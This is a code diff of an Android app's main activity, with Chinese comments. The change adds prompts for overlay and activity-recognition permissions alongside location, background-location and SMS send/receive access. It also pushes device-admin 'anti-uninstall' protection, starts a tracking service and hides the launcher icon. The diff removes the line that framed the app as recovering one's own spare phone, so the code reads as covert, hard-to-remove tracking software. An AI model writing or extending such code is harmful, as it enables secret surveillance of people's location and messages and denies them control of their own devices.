@@ -25,6 +25,7 @@ public class MainActivity extends Activity {
     private boolean waitingForBgLocSetting = false;
     private boolean waitingForBatterySetting = false;
     private boolean waitingForDeviceAdmin = false;
+    private boolean waitingForOverlaySetting = false; // 悬浮窗权限
 
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
 
@@ -57,26 +58,36 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // 2. 从“电池优化”页面返回
+        // 2. 从“悬浮窗权限”页面返回
+        if (waitingForOverlaySetting) {
+            waitingForOverlaySetting = false;
+            if (Settings.canDrawOverlays(this)) {
+                Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
+            }
+            checkDeviceAdmin(); // 继续检查设备管理器
+            return;
+        }
+
+        // 3. 从“电池优化”页面返回
         if (waitingForBatterySetting) {
             waitingForBatterySetting = false;
             if (isBatteryOptimizationIgnored()) {
                 Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
-                checkDeviceAdmin(); // 电池搞定了，去查防卸载
+                checkOverlayPermission(); // 去检查悬浮窗
             } else {
                 promptBatteryOptimizationAgain();
             }
             return;
         }
 
-        // 3. 从“应用详情页(后台定位)”返回
+        // 4. 从“应用详情页(后台定位)”返回
         if (waitingForBgLocSetting) {
             waitingForBgLocSetting = false;
             proceedAfterBackgroundLocation();
             return;
         }
 
-        // 4. 正常启动流程
+        // 5. 正常启动流程
         checkAndRequestPermissions();
     }
 
@@ -105,19 +116,22 @@ public class MainActivity extends Activity {
             }
         }
 
-        // 检查常规权限
+        // 检查常规权限（加入身体活动权限）
         boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
         boolean needBgLoc = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;
         boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
         boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                           checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
+        boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
 
-        if (needFgLoc || needNotif || needSms) {
+        if (needFgLoc || needNotif || needSms || needActivity) {
+            // 注意：身体活动权限一定要包含在里面
             requestPermissions(new String[]{
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
                     Manifest.permission.RECEIVE_SMS,
                     Manifest.permission.SEND_SMS,
+                    Manifest.permission.ACTIVITY_RECOGNITION,
                     Build.VERSION.SDK_INT >= 33 ? Manifest.permission.POST_NOTIFICATIONS : Manifest.permission.ACCESS_COARSE_LOCATION
             }, REQ_PERMISSIONS);
         } else if (needBgLoc) {
@@ -153,7 +167,7 @@ public class MainActivity extends Activity {
 
     private void proceedAfterPermissions() {
         if (isBatteryOptimizationIgnored()) {
-            checkDeviceAdmin(); // 权限全齐，检查防卸载
+            checkOverlayPermission(); // 电池OK，去检查悬浮窗
         } else {
             promptBatteryOptimization();
         }
@@ -186,7 +200,7 @@ public class MainActivity extends Activity {
                     waitingForBatterySetting = true;
                     openBatteryOptimizationSettings();
                 })
-                .setNegativeButton("暂时跳过", (dialog, which) -> checkDeviceAdmin()).show();
+                .setNegativeButton("暂时跳过", (dialog, which) -> checkOverlayPermission()).show();
     }
 
     private void promptBatteryOptimizationAgain() {
@@ -198,7 +212,7 @@ public class MainActivity extends Activity {
                     waitingForBatterySetting = true;
                     openBatteryOptimizationSettings();
                 })
-                .setNegativeButton("放弃", (dialog, which) -> checkDeviceAdmin()).show();
+                .setNegativeButton("放弃", (dialog, which) -> checkOverlayPermission()).show();
     }
 
     private void openBatteryOptimizationSettings() {
@@ -209,11 +223,31 @@ public class MainActivity extends Activity {
             else startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
         } catch (Exception e) {
             waitingForBatterySetting = false;
+            checkOverlayPermission();
+        }
+    }
+
+    // ==================== 步骤三：悬浮窗权限（新增） ====================
+
+    private void checkOverlayPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            new AlertDialog.Builder(this)
+                    .setTitle("开启悬浮窗权限")
+                    .setMessage("用于提升后台存活率，请在下一页允许「显示在其他应用上层」。")
+                    .setCancelable(false)
+                    .setPositiveButton("去开启", (dialog, which) -> {
+                        waitingForOverlaySetting = true;
+                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                                Uri.parse("package:" + getPackageName()));
+                        startActivity(intent);
+                    })
+                    .setNegativeButton("暂不开启", (dialog, which) -> checkDeviceAdmin()).show();
+        } else {
             checkDeviceAdmin();
         }
     }
 
-    // ==================== 步骤三：设备管理器（防卸载） ====================
+    // ==================== 步骤四：设备管理器（防卸载） ====================
 
     private void checkDeviceAdmin() {
         android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -222,7 +256,7 @@ public class MainActivity extends Activity {
         if (dpm != null && !dpm.isAdminActive(adminComponent)) {
             new AlertDialog.Builder(this)
                     .setTitle("开启防卸载保护")
-                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。\n\n这是找回备用机的重要保障。")
+                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。")
                     .setCancelable(false)
                     .setPositiveButton("去激活", (dialog, which) -> {
                         waitingForDeviceAdmin = true;
@@ -241,12 +275,11 @@ public class MainActivity extends Activity {
                         startTrackingServiceAndFinish();
                     }).show();
         } else {
-            // 已经激活过了，直接下一步
             startTrackingServiceAndFinish();
         }
     }
 
-    // ==================== 步骤四：启动服务 ====================
+    // ==================== 步骤五：启动服务 ====================
 
     private void startTrackingServiceAndFinish() {
         if (!serviceStarted) {
@@ -256,7 +289,7 @@ public class MainActivity extends Activity {
             else startService(intent);
             hideLauncherIcon();
         }
-        finish(); // 只有全部走完，才会执行真正的关闭
+        finish(); 
     }
 
     private void hideLauncherIcon() {
